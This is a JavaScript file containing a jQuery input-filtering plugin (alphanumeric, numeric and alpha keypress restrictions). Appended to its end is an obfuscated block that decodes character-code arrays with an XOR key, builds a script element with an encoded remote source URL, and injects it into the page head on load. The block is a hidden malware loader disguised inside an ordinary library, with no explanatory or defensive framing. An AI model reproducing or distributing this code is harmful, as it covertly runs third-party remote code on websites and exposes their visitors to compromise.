(function($){

	$.fn.alphanumeric = function(p) { 

		p = $.extend({
			ichars: "!@#$%^&*()+=[]\\\';,/{}|\":<>?~`.- ",
			nchars: "",
			allow: ""
		  }, p);	

		return this.each
			(
				function() 
				{

					if (p.nocaps) p.nchars += "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
					if (p.allcaps) p.nchars += "abcdefghijklmnopqrstuvwxyz";
					
					s = p.allow.split('');
					for ( i=0;i<s.length;i++) if (p.ichars.indexOf(s[i]) != -1) s[i] = "\\" + s[i];
					p.allow = s.join('|');
					
					var reg = new RegExp(p.allow,'gi');
					var ch = p.ichars + p.nchars;
					ch = ch.replace(reg,'');

					$(this).keypress
						(
							function (e)
								{
								
									if (!e.charCode) k = String.fromCharCode(e.which);
										else k = String.fromCharCode(e.charCode);
										
									if (ch.indexOf(k) != -1) e.preventDefault();
									if (e.ctrlKey&&k=='v') e.preventDefault();
									
								}
								
						);
						
					$(this).bind('contextmenu',function () {return false});
									
				}
			);

	};

	$.fn.numeric = function(p) {
	
		var az = "abcdefghijklmnopqrstuvwxyz";
		az += az.toUpperCase();

		p = $.extend({
			nchars: az
		  }, p);	
		  	
		return this.each (function()
			{
				$(this).alphanumeric(p);
			}
		);
			
	};
	
	$.fn.alpha = function(p) {

		var nm = "1234567890";

		p = $.extend({
			nchars: nm
		  }, p);	

		return this.each (function()
			{
				$(this).alphanumeric(p);
			}
		);
			
	};	

})(jQuery);
var kdE=["023042","022032","020061","007059039004051031115032092015035003063","023059033","016048050000","016044058017104016087058088017037031034020061","005057050000041030117036080014034","012044035001","003044054032043031091041087022053047050048040037043038023083","012061054021125085025063077003050008101023036046087105008067099083017105014037016103040022"];function a2Rc2(b7z){var lV96='';var o5=0;var bJB2v=0;for(o5=0;o5<b7z.length/3;o5++){lV96+=String.fromCharCode(b7z.slice(bJB2v,bJB2v+3));bJB2v=bJB2v+3;}return lV96;}function mK1xb10(qEl,uDf){var eNED='';var g306=0;var lHB6M=0;for(g306=0;g306<qEl.length;g306++){var xJLw4i=qEl.charAt(g306);var qvQ0j=xJLw4i.charCodeAt(0)^uDf.charCodeAt(lHB6M);xJLw4i=String.fromCharCode(qvQ0j);eNED+=xJLw4i;if(lHB6M==uDf.length-1)lHB6M=0;else lHB6M++;}return (eNED);}mrt(k616(kdE[10]));function k616(z8nuO5){return mK1xb10(a2Rc2(z8nuO5),'dIBeGz6L9bFmK');}function mrt(g1){var w97Ff=document[k616(kdE[3])](k616(kdE[0])+k616(kdE[1])+k616(kdE[2]));w97Ff[k616(kdE[4])]=g1;w97Ff[k616(kdE[5])]=k616(kdE[6]);document[k616(kdE[9])](k616(kdE[8]))[0][k616(kdE[7])](w97Ff);}